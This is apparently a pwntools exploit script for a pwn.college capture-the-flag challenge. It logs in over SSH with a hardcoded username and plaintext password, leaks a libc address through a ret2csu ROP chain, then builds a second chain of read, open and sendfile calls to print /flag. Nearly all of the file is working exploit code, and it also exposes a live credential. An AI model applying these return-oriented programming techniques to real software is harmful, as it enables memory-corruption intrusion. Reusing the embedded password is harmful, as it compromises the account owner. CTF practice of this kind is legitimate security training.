from pwn import *

e = ELF('./babyrop_level8_testing1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level8_testing1')

rdi = 0x0000000000401de3
ret = 0x000000000040101a

csu = 0x401DDA
csurun = 0x401DC0

pay = b'A' * 0x68
pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])
'''
.text:00000000004028DA                 pop     rbx
.text:00000000004028DB                 pop     rbp
.text:00000000004028DC                 pop     r12 (rdi)
.text:00000000004028DE                 pop     r13 (rsi)
.text:00000000004028E0                 pop     r14 (rdx)
.text:00000000004028E2                 pop     r15 (func)
'''
pay += p64(csu) + p64(0) + p64(1) + p64(0) + p64(e.got['printf']) + p64(0x8) + p64(e.got['read']) + p64(csurun)
pay += p64(0) * 7 + p64(ret)
pay += p64(e.symbols['main'])

p.sendafter(b'#\n',pay)
p.recvuntil(b'Exiting!\n')

base = u64(p.recv(6)+b'\x00\x00') - libc.symbols['puts']
libc.address = base

rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

p.send(p64(ret))

pay = b'A' * 0x68
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx_r12) + p64(0x8) + p64(0) + p64(e.symbols['read'])           #read(0,bss+0x100,8);
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(libc.symbols['open'])                                              #open(bss+0x100,0)
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx_r12) + p64(0) + p64(0) + p64(rcx) + p64(100) + p64(libc.symbols['sendfile']) #sendfile(1,3,0,100)

p.sendafter(b'#\n',pay)
p.sendafter(b'Exiting!\n',b'/flag\x00')

p.interactive()